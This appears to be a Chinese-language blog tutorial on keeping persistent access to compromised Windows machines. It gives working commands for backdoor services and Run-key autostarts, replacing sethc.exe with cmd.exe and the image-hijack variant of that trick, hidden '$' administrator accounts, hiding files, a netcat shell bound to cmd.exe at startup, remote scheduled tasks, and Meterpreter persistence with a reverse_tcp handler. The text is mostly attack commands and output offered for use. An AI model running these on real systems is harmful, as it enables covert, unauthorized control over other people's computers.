## 权限维持基础

### 服务添加

#### 修改注册表

在注册表编辑器，展开分支"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"，在右侧窗格中显示的就是本机安装的服务项。如果要新建服务，只须点击"编辑→新建→项"，然后为此项命名，如"test";然后右击该项，选择"新建→字符串值"或"新建→Dword值"即可。  
![](https://image.3001.net/images/20221017/1666000847_634d27cf4471616ef9d32.jpeg!small)

添加一个服务项目具体需要添加的键值如下：

    
    
    "DisplayName"，字符串值，对应服务名称;
    "Description"，字符串值，对应服务描述;
    "ImagePath"，字符串值，对应该服务程序所在的路径;
    "ObjectName"，字符串值，值为"LocalSystem"，表示本地登录;
    "ErrorControl"，Dword值，值为"1";
    "Start"，Dword值，值为2表示自动运行，值为3表示手动运行，值为4表示禁止;
    "Type"，Dword值，应用程序对应10，其它对应20。
    

另外，还要在"test"项下新建一个"Enum"项。如果有些必须通过srvany来加载的还必须
添加另外的Parameters子项在该项中提供详细的要加为服务的程序所在的路径。而上面的那个 路径就需要指到srvany所在的路径。

#### sc命令

    
    
    //创建服务, binpath后面填入服务的绝对路径
    sc create myserver binpath=c:/windows/Sc/myserver.exe
    
    //设置启动方式为自动（AUTO:自动、DEMAND:手动、DISABLED:禁用）
    sc config myservers start=auto
    
    //启动服务
    sc start myserver
    
    //删除服务
    sc delete "服务名"  //如果服务名中间有空格，就需要前后加引号
    

PS：需要在删除服务前要做几个清理工作，确保：

  1. 确保服务已停止： **net stop "ServiceName"** 。

  2. 保服务控制面板已关闭：确保关闭服务services.msc窗口。"mmc.exe" 进程不存在("服务"列表窗口)： **taskkill / F / IM mmc.exe** 。

#### 写注册表文件

一般自启动项是这两个键：Run和RunOnce，两者的区别如下：

  * Run：该项下的键值即为开机启动项，每一次随着开机而启动。

  * RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕

常见注册表启动项键的位置：

  1. 用户级

    
    
    \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    

  2. 系统级

    
    
    \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    \HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
    \HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
    

在普通用户权限下，可以将需要执行的后门程序或者脚本路径填写到注册表键。

    
    
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AUTORUN /t REG_SZ /d 'C:\xxx.exe' /f
    

  * /f ：不用询问信息而直接添加子项或项。

  * /v ：指定要添加到指定子项下的项名称。

  * /t ：指定项值的数据类型。

  * /d：新注册表项的值。

## 权限维持技术

### 粘滞键

#### Windows Vista版本之前的系统

简单概括就是将C:\Windows\system32目录下的sethc.exe替换为cmd.exe，使我们在连续按下5次shift键之后，调用cmd程序。

具体命令如下：

    
    
    cd c:\Windows\System32
    move sethc.exe sethc.exe.bak
    copy cmd.exe sethc.exe
    

![](https://image.3001.net/images/20221017/1666000848_634d27d07952521f004f4.jpeg!small)

![](https://image.3001.net/images/20221017/1666000849_634d27d1f245b3c2122db.jpeg!small)

#### Windows Vista版本之后的系统

在之后的版本中，如果要替换sethc.exe，我们需要用到trustedinstaller权限，这是一个高于Administrator的权限。

如果使用administrator权限修改，呈如下：  
![](https://image.3001.net/images/20221017/1666000850_634d27d2eb435b7610a8a.jpeg!small)

我们对所有者权限进行修改：右击–>属性–>所有者更改–>对象类型–>仅勾选用户，修改好之后，填写一个有效的用户名，并检查名称，确定用户是否存在：  
![](https://image.3001.net/images/20221017/1666000852_634d27d4067945d1db031.jpeg!small)

点击确定，该程序的所有者就改变为我们选择的用户，之后我们再进行修改权限即可。

![](https://image.3001.net/images/20221017/1666000853_634d27d518b88df0a5030.jpeg!small)

将sethc.exe文件替换为cmd.exe，我们就可以利用该后门了。(注意：cmd也需要所有者替换)

![](https://image.3001.net/images/20221017/1666000854_634d27d60cdf979ddc7a3.jpeg!small)

#### 映像劫持

我们通过修改注册表的映像劫持的方式进行修改，所以并未改变cmd的命名。

    
    
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
    

![](https://image.3001.net/images/20221017/1666000855_634d27d702aa18435ed86.jpeg!small)  
键入五下Shift执行sethc.exe程序时会执行cmd.exe程序。  
![](https://image.3001.net/images/20221017/1666000855_634d27d7ec2e260aeb595.jpeg!small)

### 影子用户

影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的。在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组。

#### 添加用户

    
    
    net user test$ Wzh.password /add
    net localgroup administrators test$ /add
    

![](https://image.3001.net/images/20221017/1666000856_634d27d8deaa24f03f328.jpeg!small)

#### 查看用户

运行常规命令发现，看不到我们创建的用户。

    
    
    net user
    

![](https://image.3001.net/images/20221017/1666000857_634d27d9cdaf34524fc23.jpeg!small)

但是计算机管理-用户和组中可以看到

![](https://image.3001.net/images/20221017/1666000858_634d27daa623546669ab0.jpeg!small)

#### 删除用户

    
    
    net user test$ /del
    

![](https://image.3001.net/images/20221017/1666000859_634d27db86d97c5f76121.jpeg!small)

### 文件隐藏

 **需要管理员权限** ，后门文件，上传exe文件，并藏好藏到一个目录下。

    
    
    attrib +h +s xxx.exe
    

显示当前目录下，被隐藏的exe文件。

    
    
    attrib -h +s xxx.exe
    

### 自启动文件

添加步骤

  1. 下载nc.exe到目标机。

  2. . 写入注册表自启动项。

    
    
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f /v "nc" /t REG_SZ /d "C:\nc.exe -Ldp 1234 -e cmd.exe"
    

![](https://image.3001.net/images/20221017/1666000860_634d27dc74122ec60d564.jpeg!small)

  3. 接收反弹shell（重启目标机器）

    
    
    nc -nv 目标ip 端口
    

![](https://image.3001.net/images/20221017/1666000861_634d27dd608a763760d59.jpeg!small)

  4. 其余木马exe也可以采用。

### 计划任务

#### schtasks

计划任务在Windows7及之前版本的操作系统中使用at命令调用，在从Windows8 版本开始的操作系统中使用schtasks
命令调用。计划任务后门分为管理员权限和普通用户权限两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行等。计划任务定时执行恶意exe文件。

  * 在windows版本大于等于windows2012下使用

  * 建立ipc连接

##### 创建计划任务

    
    
    shell schtasks /create /tn "test" /tr C:\shell.exe /sc once /st 18:05 /S 目标ip /RU System  /u username /p "password"
    

  * /tn TaskName: 指定任务的名称。

  * /tr TaskRun: 指定任务运行的程序或命令。

  * /sc schedule: 指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。

  * /st StartTime：以 HH:MM:SS 24 小时格式指定时间。默认值是命令完成时的当前本地时间。

  * /u [ domain] user：使用特定用户帐户的权限运行命令。

  * /p password：指定在 /u 参数中指定的用户帐户的密码。

![](https://image.3001.net/images/20221017/1666000862_634d27de3232404809525.jpeg!small)

##### 运行计划任务

    
    
    schtasks /run /tn "test"
    

##### 删除计划任务

    
    
    schtasks /delete /tn "test"
    

![](https://image.3001.net/images/20221017/1666000863_634d27df16ff89fed5039.jpeg!small)

#### AT

Windows
XP中内置的命令，它也可以媲美Windows中的“计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。

  * windows版本小于2012下使用

  * 建立ipc连接

##### 创建计划任务

    
    
    at \\192.168.xx.xx 23:03 ipconfig
    
    at 11:19pm c:\windows\system32\calc.exe
    

若建立ipc连接，则不用输入\ip

![](https://image.3001.net/images/20221017/1666000864_634d27e0726d0cdfbcf0b.jpeg!small)

##### 删除计划任务

    
    
    at 任务id /delete /yes
    
    at 1 /delete /yes
    

### meterpreter

#### persistence

在与目标设备的meterpreter会话中创建一个持久后门(此后门将重新生成一个木马文件，并且该文件将周期性向服务端发送TCP请求)。

    
    
    meterpreter > run persistence -h
    [!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
    [!] Example: run exploit/windows/local/persistence OPTION=value [...]
    Meterpreter Script for creating a persistent backdoor on a target host.
    
    
    OPTIONS:
    
        -A        自动启动一个匹配的exploit/multi/handler来连接到代理
        -L <opt>  如果未使用％TEMP％，则在目标主机中写入有效负载的位置
        -P <opt>  有效负载使用，默认为windows/meterpreter/reverse_tcp.
        -S        作为服务自动启动该木马（具有SYSTEM权限）
        -T <opt>  要使用的备用可执行模板
        -U        用户登录时自动启动该木马
        -X        系统引导时自动启动该木马
        -h        这个帮助菜单
        -i <opt>  每次连接尝试之间的时间间隔（秒）
        -p <opt>  运行Metasploit的系统正在侦听的端口
        -r <opt>  运行Metasploit监听连接的系统的IP
    

创建持久性后门

    
    
    meterpreter > run persistence -U -i 5 -p 123 -r 192.168.136.131
    

![](https://image.3001.net/images/20221017/1666000865_634d27e163569f447234e.jpeg!small)

此时就可以放心的断开与目标设备的session了，目标设备将周期性的向本机发送TCP请求。

再次连接

    
    
    use exploit/multi/handler
    
    # "handler"这个模块专门就是来做被动监听的，诱使目标执行任何木马后都可以用这个模块进行连接。（假如目标设备运行的meterpreter/reverse_tcp这个木马，则在服务端handler也set这个木马为payload即可）
    set payload windows/meterpreter/reverse_tcp
    
    set LHOST 192.168.136.131
    set LPORT 123
    
    # 这个如果不设置为false的话，只要建立了一个session后就不再继续监听，想要再连接其他session需要再次run。反之，如果设为false，建立了一个session后还会继续监听，无需run即可建立多个session
    set exitonsession false
    
    一般模块都有AutoRunScript参数(需show advanced查看)，此参数作用是：建立连接后自动执行后面的命令，此处即"migrate -N explorer.exe"
    set AutoRunScript migrate -N explorer.exe
    run
    

![](https://image.3001.net/images/20221017/1666000866_634d27e268f8039c4d000.jpeg!small)

![](https://image.3001.net/images/20221017/1666000867_634d27e3960f8b42d6a29.jpeg!small)

#### 自启动服务

自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。

    
    
    meterpreter > run metsvc -A
    

![](https://image.3001.net/images/20221017/1666000868_634d27e4d023d9a115619.jpeg!small)

运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe。  
![](https://image.3001.net/images/20221017/1666000869_634d27e5d4cae0a1a78a9.jpeg!small)

同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为"自动"，默认绑定在31337端口。  
![](https://image.3001.net/images/20221017/1666000871_634d27e7304a55bd56966.jpeg!small)

如果想删除服务，可以执行

    
    
    meterpreter > run metsvc -r
    

![](https://image.3001.net/images/20221017/1666000872_634d27e85543af87cf4fe.jpeg!small)

